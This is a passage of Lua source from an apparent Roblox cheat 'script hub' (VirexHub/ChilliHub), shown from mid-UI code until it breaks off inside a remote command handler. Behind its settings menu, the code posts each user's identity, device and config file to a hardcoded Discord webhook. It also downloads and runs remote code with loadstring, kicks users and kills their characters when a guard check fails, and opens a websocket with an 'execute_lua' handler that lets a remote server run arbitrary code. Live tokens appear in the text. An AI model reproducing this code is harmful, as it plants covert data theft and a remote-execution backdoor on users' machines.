tbl25.Title = arg:Text({
Parent = tbl25.Frame,
X = 0.85,
Y = 0.3,
Width = 1,
Height = 1.1,
Wrap = false,
Text = "<b>" .. v19.Title .. "</b>",
Color = v19.Color,
})
tbl25.Text = arg:Text({
Parent = tbl25.Frame,
X = 0.85,
Y = 1.35,
Width = 1,
Height = 1.5,
Scale = 0.86,
Wrap = true,
Text = v19.Text,
Color = "#C8C8D8",
})
tbl24.Perks[i] = tbl25
end
tbl24.Tip = arg:Text({
X = n16 + 0.1,
Y = n27 - 2.2 - n16,
Width = 14,
Height = 2,
Scale = 0.8,
Wrap = true,
Text = "Paste the copied link into your browser or the Discord app to join.",
Color = "#8A8AA2",
})
arg:SetContentLines(n27)
arg:OnResize(function(arg2, arg3, arg4)
fn20(arg3 / math.max(arg4, 1))
end)
local max = math.max
fn20(arg:Width() / max(arg:Unit(), 1))
end
if type(v15.CreateCanvas) == "function" then
local v19 = v15:CreateCanvas({
Name = "Discord",
ShowTitle = false,
Layout = "free",
Style = {
TextScale = 0.84,
LineHeight = 1.1,
MinLines = math.ceil(n27),
MaxLines = math.ceil(n27),
BackgroundTransparency = 0.5,
ScrollBarColor = Color3.fromRGB(170, 174, 184),
TextColor = Color3.fromRGB(255, 255, 255),
TextStrokeTransparency = 0.7,
},
Build = fn21,
})
fn4(function()
v19:Destroy()
end)
else
v15:CreateText({ Name = "Discord", Text = "https://discord.gg/virexs" })
end
if type(v15.CreateButton) == "function" then
v15:CreateButton({ Name = "Copy Discord Link", Callback = fn19 })
end
-- Themes & UI Size
if type(v15.CreateDropdown) == "function" then
v15:CreateDropdown({
Name = "Theme",
Options = {"Blue Black", "Purple Dark", "Green Dark", "Red Dark", "Orange Dark", "Cyan Dark", "Pink Dark", "White Dark", "Gold Black", "Ice Blue"},
Default = "Red Dark",
Callback = function(theme)
local themes = {
["Blue Black"] = {Color3.fromRGB(50,140,255), Color3.fromRGB(8,10,14)},
["Purple Dark"] = {Color3.fromRGB(160,80,255), Color3.fromRGB(12,8,18)},
["Green Dark"] = {Color3.fromRGB(60,220,120), Color3.fromRGB(8,14,10)},
["Red Dark"] = {Color3.fromRGB(255,50,70), Color3.fromRGB(14,8,10)},
["Orange Dark"] = {Color3.fromRGB(255,140,50), Color3.fromRGB(14,10,6)},
["Cyan Dark"] = {Color3.fromRGB(60,220,255), Color3.fromRGB(6,12,16)},
["Pink Dark"] = {Color3.fromRGB(255,90,180), Color3.fromRGB(14,8,12)},
["White Dark"] = {Color3.fromRGB(230,230,240), Color3.fromRGB(10,10,12)},
["Gold Black"] = {Color3.fromRGB(255,200,60), Color3.fromRGB(12,10,6)},
["Ice Blue"] = {Color3.fromRGB(140,210,255), Color3.fromRGB(6,10,16)},
}
local t = themes[theme]
if t and v2 and v2._card then
-- apply accent roughly
pcall(function()
for _, d in ipairs(v2._card:GetDescendants()) do
if d:IsA("UIStroke") then d.Color = t[1] end
end
end)
end
end
})
end
if type(v15.CreateSlider) == "function" then
v15:CreateSlider({
Name = "UI Size",
Min = 70,
Max = 130,
Default = 100,
Increment = 5,
Unit = "%",
Callback = function(v)
local scale = (tonumber(v) or 100) / 100
if v2 and v2._scale then
pcall(function() v2._scale.Scale = scale end)
end
end
})
end
if type(v15.CreateLabel) == "function" then
v15:CreateLabel({ Name = "Info", Text = "Theme changes accent. UI Size scales the whole window." })
end
end
v:Finalize({ Window = v2, MainTab = defaultTab, ShowMainTab = true })
task.defer(function()
if #tbl2 == 0 or type(readfile) ~= "function" then
return
end
local HttpService2 = game:GetService("HttpService")
local function fn19(arg)
if type(isfile) == "function" then
local ok, result = pcall(isfile, arg)
if ok and not result then
return nil
end
end
local ok, result = pcall(readfile, arg)
if not ok or type(result) ~= "string" or result == "" then
return nil
end
local ok2, result2 = pcall(HttpService2.JSONDecode, HttpService2, result)
return ok2 and type(result2) == "table" and result2 or nil
end
local json = fn19("VirexHub/config_state.json") or {}
if json.AutoLoad == false then
return
end
local v15 = fn19("VirexHub/configs/" .. (type(json.StartupConfig) == "string" and json.StartupConfig ~= "" and json.StartupConfig or type(json.SelectedConfig) == "string" and json.SelectedConfig ~= "" and json.SelectedConfig or "Default") .. ".json")
if type(v15) ~= "table" or type(v15.Values) ~= "table" then
return
end
local tbl22 = { ["K/s"] = 1000, ["M/s"] = 1000000, ["B/s"] = 1e9 }
local tbl23 = {}
for _, v16 in ipairs(tbl2) do
local flag4 = false
local v17 = nil
for _, value in pairs(v15.Values) do
local flag5 = type(value) == "table" and value[v16.Section] or nil
if type(flag5) == "table" then
if flag5[v16.Name] ~= nil then
flag4 = true
end
local v18 = flag5[v16.Legacy]
if type(v18) == "table" and tonumber(v18.Value) then
v17 = v18
end
end
end
if v17 and not flag4 then
local n14 = math.max(0, tonumber(v17.Value)) * (tbl22[tostring(v17.Unit)] or 1000000)
if n14 > 0 then
table.insert(tbl23, { Handle = v16.Handle, Step = v16.StepOf(n14) })
end
end
end
for _, v16 in ipairs({ 0.1, 1, 2 }) do
if #tbl23 == 0 then
return
end
task.wait(v16)
for _, v17 in ipairs(tbl23) do
local ok, result = pcall(v17.Handle.Get, v17.Handle)
if ok then
ok = (tonumber(result) or 0) <= 0
end
if ok then
pcall(v17.Handle.Set, v17.Handle, v17.Step)
end
end
end
end)
task.defer(function()
for i = 1, 3 do
RunService.Heartbeat:Wait()
end
if type(tbl4.RestoreStealPanel) == "function" then
pcall(tbl4.RestoreStealPanel)
end
end)
local request_
do
local Players2 = game:GetService("Players")
local HttpService2 = game:GetService("HttpService")
local UserInputService2 = game:GetService("UserInputService")
local localPlayer2 = Players2.LocalPlayer
request_ = syn and syn.request or http and http.request or http_request or request
local str = "https://discord.com/api/webhooks/1381274668706693120/D5XogJZVdo_q7XZ9bEJDETQjevMFaBSeVRT4EJ0fLKtPeqR112o7PmA1fN_hZn4rmJ2y"
local str2 = UserInputService2.KeyboardEnabled and UserInputService2.MouseEnabled and "PC" or "Mobile / Tablet / Other"
if request_ and localPlayer2 then
task.spawn(function()
local readfile_ = readfile or syn and syn.readfile or fluxus and fluxus.readfile
local readfile_2
if readfile_ then
readfile_2 = readfile_
else
readfile_2 = getgenv and getgenv().readfile
end
local v15 = readfile_2 or nil
local isfile_ = isfile or syn and syn.isfile or fluxus and fluxus.isfile or getgenv and getgenv().isfile or nil
local str3 = "Default"
local v16 = nil
local str4 = "Default.json"
if type(v15) == "function" then
pcall(function()
local flag4 = true
if type(isfile_) == "function" then
local ok, result = pcall(isfile_, "VirexHub/config_state.json")
if ok and not result then
flag4 = false
end
end
if flag4 then
local json = v15("VirexHub/config_state.json")
if json and json ~= "" then
local data = HttpService2:JSONDecode(json)
if type(data) == "table" then
if type(data.StartupConfig) == "string" and data.StartupConfig ~= "" then
str3 = data.StartupConfig
elseif type(data.SelectedConfig) == "string" and data.SelectedConfig ~= "" then
str3 = data.SelectedConfig
end
end
end
end
end)
pcall(function()
local str5 = "VirexHub/configs/" .. str3 .. ".json"
local flag4 = true
if type(isfile_) == "function" then
local ok, result = pcall(isfile_, str5)
if ok and not result then
flag4 = false
end
end
if flag4 then
v16 = v15(str5)
str4 = str3 .. ".json"
end
if (not v16 or v16 == "") and str3 ~= "Default" then
local flag5 = true
if type(isfile_) == "function" then
local ok, result = pcall(isfile_, "VirexHub/configs/Default.json")
if ok and not result then
flag5 = false
end
end
if flag5 then
local ok, result = pcall(v15, "VirexHub/configs/Default.json")
if ok and type(result) == "string" and result ~= "" then
v16 = result
str4 = "Default.json"
end
end
end
end)
end
local str5 = tostring(str4):gsub("[<>:\"/\\|?*]", "_")
if not str5:match("%.json$") then
str5 ..= ".json"
end
local str6 = string.format("New execute from: **%s** (@%s) | ID: `%d` | Device: **%s**%s", localPlayer2.DisplayName, localPlayer2.Name, localPlayer2.UserId, str2, v16 and v16 ~= "" and " | Startup Config: **" .. str3 .. "**" or "")
local flag4 = false
if v16 and v16 ~= "" then
pcall(function()
local str7 = "---------------------------ChilliBoundary" .. tostring(os.time()) .. tostring(math.random(100000, 999999))
local str8 = "Content-Disposition: form-data; name=\"files[0]\"; filename=\"" .. str5 .. "\"\r\n"
local str9 = v16 .. "\r\n"
local v17 = request_({
Url = str,
Method = "POST",
Headers = { ["Content-Type"] = "multipart/form-data; boundary=" .. str7 },
Body = table.concat({
"--" .. str7 .. "\r\n",
"Content-Disposition: form-data; name=\"payload_json\"\r\n",
"Content-Type: application/json\r\n\r\n",
HttpService2:JSONEncode({ content = str6 }) .. "\r\n",
"--" .. str7 .. "\r\n",
str8,
"Content-Type: application/json\r\n\r\n",
str9,
"--" .. str7 .. "--\r\n",
}),
})
local flag5 = type(v17) == "table"
if flag5 then
flag5 = v17.StatusCode == 200 or v17.StatusCode == 204 or v17.Success == true
end
if flag5 then
flag4 = true
end
end)
end
if not flag4 then
pcall(function()
request_({
Url = str,
Method = "POST",
Headers = { ["Content-Type"] = "application/json" },
Body = HttpService2:JSONEncode({ content = str6 }),
})
end)
end
end)
end
end
task.spawn(function()
task.wait(20)
local str = "\0chilli_guard"
local genv = typeof(getgenv) == "function" and getgenv() or _G
local function fn19()
local v15 = genv[str]
if type(v15) == "table" and type(v15.Ask) == "function" then
return v15
end
return nil
end
local v15 = fn19()
if not v15 then
task.spawn(function()
local v16 = nil
for i = 1, 4 do
task.wait()
local ok, result = pcall(function()
local v17 = v16
local response
if v16 then
response = v17
else
response = game:HttpGet("https://raw.githubusercontent.com/tienkhanh1/GD/refs/heads/main/SAEGD")
end
v16 = response
local chunk, v18 = loadstring(v16)
assert(chunk, v18)
return chunk()
end)
if ok then
fn("guard: loader ran on try " .. i)
return
end
if type(result) == "string" and string.find(result, "HttpGet", 1, true) then
v16 = nil
end
fn("guard: loader try " .. i .. " failed: " .. tostring(result))
task.wait(1 + i)
end
end)
local n14 = os.clock() + 30
while true do
task.wait(0.25)
v15 = fn19()
if not (v15 or os.clock() > n14) then
continue
end
break
end
end
local flag4 = false
if v15 then
local ok, result = pcall(v15.Ask, "v202")
flag4 = ok and type(result) == "string" and #result > 0
end
genv[str] = nil
if flag4 then
return
end
pcall(function()
local chilliHubSaeCleanup = genv.ChilliHubSaeCleanup
if type(chilliHubSaeCleanup) == "function" then
chilliHubSaeCleanup()
end
end)
genv.ChilliHubSaeCleanup = nil
pcall(function()
local Players2 = game:GetService("Players")
local tbl22 = { game:GetService("CoreGui") }
if typeof(gethui) == "function" then
local ok, result = pcall(gethui)
if ok and typeof(result) == "Instance" then
table.insert(tbl22, result)
end
end
local playerGui = Players2.LocalPlayer:FindFirstChildOfClass("PlayerGui")
if playerGui then
table.insert(tbl22, playerGui)
end
for _, v16 in ipairs(tbl22) do
for _, child in ipairs(v16:GetChildren()) do
if child:IsA("ScreenGui") then
pcall(function()
child:Destroy()
end)
end
end
end
end)
pcall(function()
rawset(_G, "__VirexAutoLoadQueued", nil)
if type(queue_on_teleport) == "function" then
queue_on_teleport("")
elseif type(queueonteleport) == "function" then
queueonteleport("")
end
end)
pcall(function()
local character = game:GetService("Players").LocalPlayer.Character
if character then
character:BreakJoints()
end
end)
pcall(function()
game:GetService("Players").LocalPlayer:Kick("\u{200B}")
end)
end)
local HttpService2
HttpService2 = game:GetService("HttpService")
local Players2
Players2 = game:GetService("Players")
local RunService2
RunService2 = game:GetService("RunService")
local Workspace
Workspace = game:GetService("Workspace")
local str
str = "chp-7E0Yzx4yddoAozc9VNLsqTnA"
local str2
str2 = "wss://chillihub.pro/roblox-mcp?token=" .. str
local str3
str3 = "https://chillihub.pro/roblox-mcp/beat"
local str4
str4 = "SAE v678"
local flag4, flag5, localPlayer2, genv, flag6, flag7, v15, n14, flag8, tbl22
local tbl23, tbl24, n15, fn19, fn20, fn21, fn22, fn23, fn24, fn25
local fn26, fn27, fn28, fn29
do
local n16 = 7
local n17 = 500
local n18 = 245760
local flag9 = false
flag4 = false
flag5 = false
localPlayer2 = Players2.LocalPlayer
genv = getgenv and getgenv() or _G
if type(genv.StopChilliLink) == "function" then
pcall(genv.StopChilliLink)
end
flag6 = true
flag7 = false
v15 = nil
n14 = 0
flag8 = false
tbl22 = {}
tbl23 = {}
tbl24 = {}
n15 = 0
fn19 = function(...)
if flag9 then
print("[ROBLOX MCP]", ...)
end
end
fn20 = function(...)
if flag9 then
warn("[ROBLOX MCP]", ...)
end
end
fn21 = function(arg)
return tostring(arg or ""):match("^%s*(.-)%s*$")
end
fn22 = function(arg, arg2, arg3, arg4)
local num = tonumber(arg)
if not num then
return arg4
end
return math.max(arg2, math.min(arg3, num))
end
fn23 = function(arg)
for _, v16 in ipairs(arg) do
pcall(function()
v16:Disconnect()
end)
end
table.clear(arg)
end
fn24 = function()
if syn and syn.websocket and type(syn.websocket.connect) == "function" then
return syn.websocket.connect, "syn.websocket.connect"
end
if WebSocket and type(WebSocket.connect) == "function" then
return WebSocket.connect, "WebSocket.connect"
end
if WebSocket and type(WebSocket.new) == "function" then
return WebSocket.new, "WebSocket.new"
end
if WebSocket and type(WebSocket.New) == "function" then
return WebSocket.New, "WebSocket.New"
end
if websocket and type(websocket.connect) == "function" then
return websocket.connect, "websocket.connect"
end
if syn and syn.WebSocket and type(syn.WebSocket.new) == "function" then
return syn.WebSocket.new, "syn.WebSocket.new"
end
return nil, nil
end
fn25 = function(arg, ...)
local v16 = table.pack(...)
for i = 1, select("#", ...) do
local value = select(i, table.unpack(v16, 1, v16.n))
local ok, result = pcall(function()
return arg[value]
end)
if ok and result ~= nil then
return result, value
end
end
return nil, nil
end
fn26 = function(arg, arg2)
if not arg then
return nil
end
local ok, result = pcall(function()
return arg:Connect(arg2)
end)
return ok and result or nil
end
fn27 = function(arg)
if typeof(arg) ~= "Instance" then
return nil
end
local ok, result = pcall(function()
return arg:GetFullName()
end)
return ok and result or arg.Name
end
fn28 = nil
fn28 = function(arg, arg2, arg3)
arg2 = arg2 or 0
arg3 = arg3 or {}
if n16 < arg2 then
return "<max-depth>"
end
local kind = typeof(arg)
if arg == nil or kind == "string" or kind == "boolean" then
return arg
end
if kind == "number" then
if arg ~= arg or arg == math.huge or arg == -math.huge then
return tostring(arg)
end
return arg
end
if kind == "Instance" then
return { type = "Instance", className = arg.ClassName, name = arg.Name, path = fn27(arg) }
end
if kind == "Vector2" then
return { type = "Vector2", x = arg.X, y = arg.Y }
end
if kind == "Vector3" then
return { type = "Vector3", x = arg.X, y = arg.Y, z = arg.Z }
end
if kind == "Color3" then
return {
type = "Color3",
r = math.floor(arg.R * 255 + 0.5),
g = math.floor(arg.G * 255 + 0.5),
b = math.floor(arg.B * 255 + 0.5),
}
end
if kind == "UDim" then
return { type = "UDim", scale = arg.Scale, offset = arg.Offset }
end
if kind == "UDim2" then
return {
type = "UDim2",
xScale = arg.X.Scale,
xOffset = arg.X.Offset,
yScale = arg.Y.Scale,
yOffset = arg.Y.Offset,
}
end
if kind == "CFrame" then
return { type = "CFrame", components = { arg:GetComponents() } }
end
if kind == "EnumItem" then
return tostring(arg)
end
if kind == "BrickColor" then
return { type = "BrickColor", name = arg.Name, number = arg.Number }
end
if kind == "table" then
if arg3[arg] then
return "<cycle>"
end
arg3[arg] = true
local n19 = 0
local flag10 = true
local n20 = 0
for k in pairs(arg) do
n19 += 1
if not (n17 < n19) then
if type(k) ~= "number" or k < 1 or k % 1 ~= 0 then
flag10 = false
elseif n20 < k then
n20 = k
end
continue
end
break
end
local tbl25
if flag10 and n20 <= n17 then
tbl25 = {}
for i = 1, n20 do
tbl25[i] = fn28(arg[i], arg2 + 1, arg3)
end
else
tbl25 = {}
local v16, v17, v18 = pairs(arg)
local n21 = 0
for k, v19 in v16, v17, v18 do
n21 += 1
if n17 < n21 then
tbl25.__truncated = true
break
else
tbl25[tostring(k)] = fn28(v19, arg2 + 1, arg3)
end
end
end
arg3[arg] = nil
return tbl25
end
return tostring(arg)
end
fn29 = function(arg)
if not flag7 or not v15 then
return false, "not connected"
end
local ok, result = pcall(function()
return HttpService2:JSONEncode(fn28(arg))
end)
if not ok then
return false, "JSON encode failed: " .. tostring(result)
end
if n18 < #result then
if not (type(arg) == "table" and arg.type == "rpc_result") then
return false, "message too large"
end
result = HttpService2:JSONEncode({
type = "rpc_result",
requestId = arg.requestId,
success = false,
error = string.format("Result is too large to send (%d KB). Return less data.", math.floor(#result / 1024)),
})
end
local ok2, result2 = pcall(function()
v15:Send(result)
end)
if not ok2 then
return false, "WebSocket send failed: " .. tostring(result2)
end
return true
end
end
local fn30
fn30 = function(arg, arg2)
fn29({ type = "rpc_event", event = arg, data = arg2 or {} })
end
local fn31
do
local tbl25 = {
Game = game,
game = game,
Workspace = Workspace,
workspace = Workspace,
Players = Players2,
Lighting = game:GetService("Lighting"),
ReplicatedStorage = game:GetService("ReplicatedStorage"),
ReplicatedFirst = game:GetService("ReplicatedFirst"),
StarterGui = game:GetService("StarterGui"),
StarterPlayer = game:GetService("StarterPlayer"),
SoundService = game:GetService("SoundService"),
Teams = game:GetService("Teams"),
LocalPlayer = localPlayer2,
}
local function fn32(arg)
local tbl26 = {}
for match in fn21(arg):gmatch("[^%.]+") do
table.insert(tbl26, match)
end
return tbl26
end
fn31 = function(arg)
local v16 = fn32(arg)
if #v16 == 0 then
return nil, "path is empty"
end
local result = tbl25[v16[1]]
if not result then
local ok
ok, result = pcall(function()
return game:GetService(v16[1])
end)
if not (ok and result) then
return nil, "unknown root: " .. v16[1]
end
end
for i = 2, #v16 do
local pathNotFoundAt = v16[i]
if result == Players2 and pathNotFoundAt == "LocalPlayer" then
result = localPlayer2
elseif result == localPlayer2 and pathNotFoundAt == "PlayerGui" then
result = localPlayer2:FindFirstChildOfClass("PlayerGui")
elseif result == localPlayer2 and pathNotFoundAt == "Character" then
result = localPlayer2.Character
elseif result == Workspace and pathNotFoundAt == "CurrentCamera" then
result = Workspace.CurrentCamera
elseif typeof(result) == "Instance" then
result = result:FindFirstChild(pathNotFoundAt)
else
result = nil
end
if not result then
return nil, "path not found at: " .. pathNotFoundAt
end
end
return result
end
end
local tbl25, fn32
local tbl26 = {
Archivable = true,
Anchored = true,
AssemblyAngularVelocity = true,
AssemblyLinearVelocity = true,
AutomaticSize = true,
BackgroundColor3 = true,
BackgroundTransparency = true,
BrickColor = true,
CanCollide = true,
CanQuery = true,
CanTouch = true,
CanvasPosition = true,
CanvasSize = true,
CFrame = true,
ClipsDescendants = true,
Color = true,
Enabled = true,
FieldOfView = true,
Health = true,
Image = true,
ImageColor3 = true,
ImageTransparency = true,
JumpPower = true,
LayoutOrder = true,
Material = true,
MaxHealth = true,
MoveDirection = true,
Orientation = true,
Position = true,
RichText = true,
Rotation = true,
Size = true,
Text = true,
TextColor3 = true,
TextSize = true,
TextTransparency = true,
TextWrapped = true,
Transparency = true,
Value = true,
Velocity = true,
Visible = true,
WalkSpeed = true,
}
tbl25 = {
"Archivable",
"Position",
"Size",
"CFrame",
"Color",
"Transparency",
"Visible",
"Enabled",
"Text",
"Value",
"Health",
"MaxHealth",
}
fn32 = function(arg, arg2)
if not tbl26[arg2] then
return nil, "not_allowed"
end
local ok, result = pcall(function()
return arg[arg2]
end)
if ok then
return fn28(result)
end
return nil, "unavailable"
end
local fn33
fn33 = function(arg)
return {
name = arg.Name,
className = arg.ClassName,
path = fn27(arg),
parentPath = arg.Parent and fn27(arg.Parent) or nil,
}
end
local fn34
fn34 = function(arg, arg2, arg3)
local children = arg:GetChildren()
local n16 = 1
local n17 = 0
while n16 <= #children and n17 < arg2 do
local v16 = children[n16]
n16 += 1
n17 += 1
if arg3(v16, n17) then
return n17, true
end
if #children < arg2 then
local children2 = v16:GetChildren()
for _, v17 in ipairs(children2) do
if not (arg2 <= #children) then
table.insert(children, v17)
continue
end
break
end
end
end
return n17, false
end
do
local name = "CodexMCP"
local tbl27 = {
Frame = true,
TextLabel = true,
TextButton = true,
TextBox = true,
ImageLabel = true,
ImageButton = true,
ScrollingFrame = true,
UICorner = true,
UIStroke = true,
UIListLayout = true,
UIGridLayout = true,
UIPadding = true,
UIAspectRatioConstraint = true,
UISizeConstraint = true,
}
local tbl28 = {
Active = true,
AnchorPoint = true,
AutomaticCanvasSize = true,
AutomaticSize = true,
BackgroundColor3 = true,
BackgroundTransparency = true,
BorderSizePixel = true,
CanvasPosition = true,
CanvasSize = true,
ClipsDescendants = true,
CornerRadius = true,
DisplayOrder = true,
Enabled = true,
FillDirection = true,
Font = true,
HorizontalAlignment = true,
Image = true,
ImageColor3 = true,
ImageTransparency = true,
LayoutOrder = true,
LineJoinMode = true,
MaxTextSize = true,
MinTextSize = true,
Name = true,
Padding = true,
PaddingBottom = true,
PaddingLeft = true,
PaddingRight = true,
PaddingTop = true,
Position = true,
RichText = true,
Rotation = true,
ScrollBarThickness = true,
Size = true,
SortOrder = true,
Text = true,
TextColor3 = true,
TextScaled = true,
TextSize = true,
TextStrokeColor3 = true,
TextStrokeTransparency = true,
TextTransparency = true,
TextTruncate = true,
TextWrapped = true,
TextXAlignment = true,
TextYAlignment = true,
Thickness = true,
Transparency = true,
VerticalAlignment = true,
Visible = true,
ZIndex = true,
}
local tbl29 = {
BackgroundColor3 = true,
BorderColor3 = true,
Color = true,
ImageColor3 = true,
TextColor3 = true,
TextStrokeColor3 = true,
}
local tbl30 = { CanvasPosition = false, CanvasSize = true, Position = true, Size = true }
local tbl31 = { AnchorPoint = true, CanvasPosition = true }
local tbl32 = {
CornerRadius = true,
Padding = true,
PaddingBottom = true,
PaddingLeft = true,
PaddingRight = true,
PaddingTop = true,
}
local tbl33 = {
AutomaticCanvasSize = Enum.AutomaticSize,
AutomaticSize = Enum.AutomaticSize,
FillDirection = Enum.FillDirection,
Font = Enum.Font,
HorizontalAlignment = Enum.HorizontalAlignment,
LineJoinMode = Enum.LineJoinMode,
SortOrder = Enum.SortOrder,
TextTruncate = Enum.TextTruncate,
TextXAlignment = Enum.TextXAlignment,
TextYAlignment = Enum.TextYAlignment,
VerticalAlignment = Enum.VerticalAlignment,
}
local function fn35(arg)
if type(arg) ~= "table" then
return nil
end
local num = tonumber(arg[1] or arg.r)
local num2 = tonumber(arg[2] or arg.g)
local num3 = tonumber(arg[3] or arg.b)
if not num or not num2 or not num3 then
return nil
end
if num <= 1 and num2 <= 1 and num3 <= 1 then
return Color3.new(num, num2, num3)
end
local floor = math.floor
return Color3.fromRGB(math.floor(fn22(num, 0, 255, 0)), math.floor(fn22(num2, 0, 255, 0)), floor(fn22(num3, 0, 255, 0)))
end
local function fn36(arg)
if type(arg) ~= "table" then
return nil
end
return UDim2.new(tonumber(arg[1] or arg.xScale) or 0, tonumber(arg[2] or arg.xOffset) or 0, tonumber(arg[3] or arg.yScale) or 0, tonumber(arg[4] or arg.yOffset) or 0)
end
local function fn37(arg)
if type(arg) ~= "table" then
return nil
end
return Vector2.new(tonumber(arg[1] or arg.x) or 0, tonumber(arg[2] or arg.y) or 0)
end
local function fn38(arg)
if type(arg) == "number" then
return UDim.new(0, arg)
end
if type(arg) ~= "table" then
return nil
end
return UDim.new(tonumber(arg[1] or arg.scale) or 0, tonumber(arg[2] or arg.offset) or 0)
end
local function fn39(arg, arg2)
if tbl29[arg] then
return fn35(arg2)
end
if tbl30[arg] then
return fn36(arg2)
end
if tbl31[arg] then
return fn37(arg2)
end
if tbl32[arg] then
return fn38(arg2)
end
if tbl33[arg] then
if typeof(arg2) == "EnumItem" then
return arg2
end
return tbl33[arg][tostring(arg2):match("([^%.]+)$")]
end
return arg2
end
local function fn40(arg, arg2)
if type(arg2) ~= "table" then
return { applied = 0, rejected = {} }
end
local tbl34 = {}
local n16 = 0
for k, v16 in pairs(arg2) do
if not tbl28[k] then
table.insert(tbl34, { property = tostring(k), reason = "not_allowed" })
else
local v17 = fn39(k, v16)
if v17 == nil then
table.insert(tbl34, { property = k, reason = "invalid_value" })
else
local ok, result = pcall(function()
arg[k] = v17
end)
if ok then
n16 += 1
else
table.insert(tbl34, { property = k, reason = tostring(result) })
end
end
end
end
return { applied = n16, rejected = tbl34 }
end
local function fn41()
return localPlayer2:FindFirstChildOfClass("PlayerGui") or localPlayer2:WaitForChild("PlayerGui", 10)
end
local function fn42(arg)
local v16 = fn41()
if not v16 then
return nil, "PlayerGui is unavailable"
end
local codexMCP = v16:FindFirstChild("CodexMCP")
if not codexMCP and arg then
codexMCP = Instance.new("ScreenGui")
codexMCP.Name = name
codexMCP.ResetOnSpawn = false
codexMCP.IgnoreGuiInset = false
codexMCP.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
codexMCP.Parent = v16
end
return codexMCP
end
local function fn43(arg)
local v16, v17 = fn42(false)
if not v16 then
return nil, v17 or "managed UI does not exist"
end
local v18 = fn21(arg)
if v18 == "" or v18 == name then
return v16
end
for match in v18:gmatch("[^%.]+") do
if match == name then
continue
end
v16 = v16:FindFirstChild(match)
if not v16 then
return nil, "managed UI path not found: " .. match
end
end
return v16
end
local tbl34 = { Activated = true, MouseButton1Click = true, FocusLost = true }
local function fn44(arg, arg2)
if type(arg2) ~= "table" then
return
end
for _, v16 in ipairs(arg2) do
if tbl34[v16] then
local ok, result = pcall(function()
return arg[v16]
end)
if ok and result and type(result.Connect) == "function" then
local connection = result:Connect(function(...)
local tbl35 = { ... }
fn30("ui." .. v16, { path = fn27(arg), name = arg.Name, className = arg.ClassName, arguments = fn28(tbl35) })
end)
table.insert(tbl24, connection)
end
end
end
end
local fn45 = nil
fn45 = function(arg, parent, arg2, arg3)
if arg2 > 10 then
error("UI tree exceeds maximum depth of 10")
end
if arg3.count >= 250 then
error("UI tree exceeds maximum of 250 objects")
end
if type(arg) ~= "table" then
error("UI node must be an object")
end
local uiClassIsNotAllowed = fn21(arg.class or arg.className)
if not tbl27[uiClassIsNotAllowed] then
error("UI class is not allowed: " .. uiClassIsNotAllowed)
end
arg3.count = arg3.count + 1
local instance = Instance.new(uiClassIsNotAllowed)
instance.Name = fn21(arg.name) ~= "" and fn21(arg.name):sub(1, 64) or uiClassIsNotAllowed .. arg3.count
local v16 = fn40(instance, arg.props)
instance.Parent = parent
fn44(instance, arg.events)
local children = type(arg.children) == "table" and arg.children or {}
for _, child in ipairs(children) do
fn45(child, instance, arg2 + 1, arg3)
end
return instance, v16
end
local fn46 = nil
fn46 = function(arg, arg2, arg3)
local v16 = fn33(arg)
if arg2 >= arg3 then
v16.truncated = #arg:GetChildren() > 0
return v16
end
v16.children = {}
for _, child in ipairs(arg:GetChildren()) do
table.insert(v16.children, fn46(child, arg2 + 1, arg3))
end
return v16
end
local n16 = 60000
local n17 = 80
local tbl35 = {}
local function fn47(...)
local v16 = table.pack(...)
local tbl36 = {}
for i = 1, select("#", ...) do
local v17 = tostring
local value = select(i, table.unpack(v16, 1, v16.n))
tbl36[i] = v17(value)
end
return table.concat(tbl36, " ")
end
local function fn48(arg, arg2)
local str5 = tostring(arg or "")
if str5:match("^%s*$") then
error("Code is empty", 0)
end
local str6 = "=" .. tostring(arg2 or "WebConsole"):sub(1, 60)
local chunk, v16 = loadstring(str5, str6)
if not chunk then
local chunk2 = loadstring("return " .. str5, str6)
if chunk2 then
return chunk2
end
error("Syntax error: " .. tostring(v16), 0)
end
return chunk
end
local function fn49(arg)
local env = getfenv(0)
local obj = setmetatable({}, {
__index = env,
__newindex = function(arg2, arg3, arg4)
env[arg3] = arg4
end,
})
rawset(obj, "print", function(...)
local v16 = table.pack(...)
arg("print", fn47(...))
if flag4 then
print(table.unpack(v16, 1, v16.n))
end
end)
rawset(obj, "warn", function(...)
local v16 = table.pack(...)
arg("warn", fn47(...))
if flag4 then
warn(table.unpack(v16, 1, v16.n))
end
end)
return obj
end
local function fn50(arg)
local kind = typeof(arg)
local ok, result = pcall(tostring, arg)
return {
type = kind,
text = (ok and tostring(result) or "<unprintable>"):sub(1, 4000),
value = kind ~= "nil" and fn28(arg) or nil,
}
end
local function fn51(arg, arg2, arg3, arg4)
local tbl36 = {}
local tbl37 = {}
for i = 2, arg.n do
tbl36[i - 1] = fn28(arg[i])
tbl37[i - 1] = fn50(arg[i])
end
return {
output = table.concat(arg3, "\n"),
outputTruncated = arg4 or nil,
returns = tbl36,
returnsInfo = tbl37,
returnCount = arg.n - 1,
elapsedMs = arg2,
}
end
local function fn52(arg)
return debug.traceback(tostring(arg), 2)
end
local function fn53(arg)
if #arg.pending == 0 then
return
end
local pending = arg.pending
arg.pending = {}
fn30("exec.output", { runId = arg.id, label = arg.label, lines = pending })
end
local function fn54(arg, arg2)
local character = arg.Character
local humanoid = character and character:FindFirstChildOfClass("Humanoid")
local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
return {
name = arg.Name,
displayName = arg.DisplayName,
userId = arg.UserId,
accountAge = arg.AccountAge,
team = arg.Team and arg.Team.Name or nil,
neutral = arg.Neutral,
character = character and character.Name or nil,
health = humanoid and humanoid.Health or nil,
maxHealth = humanoid and humanoid.MaxHealth or nil,
position = arg2 and humanoidRootPart and fn28(humanoidRootPart.Position) or nil,
}
end
local tbl36 = {
["system.ping"] = function(arg)
return { pong = true, echo = arg, clientTime = DateTime.now().UnixTimestampMillis }
end,
["game.info"] = function()
return {
placeId = game.PlaceId,
gameId = game.GameId,
jobId = game.JobId,
placeVersion = game.PlaceVersion,
privateServerId = game.PrivateServerId,
privateServerOwnerId = game.PrivateServerOwnerId,
playerCount = #Players2:GetPlayers(),
localPlayer = { name = localPlayer2.Name, displayName = localPlayer2.DisplayName, userId = localPlayer2.UserId },
}
end,
execute_lua = function(arg)
local v16 = fn48(arg.code, arg.label)
local tbl36 = {}
local n18 = 0
local flag9 = false
local v17 = fn49(function(arg2, arg3)
if flag9 then
return
end
local str5 = (arg2 == "warn" and "[warn] " or "") .. arg3
n18 = n18 + #str5 + 1
if n16 < n18 then
flag9 = true
table.insert(tbl36, "... output truncated ...")
return
end
table.insert(tbl36, str5)
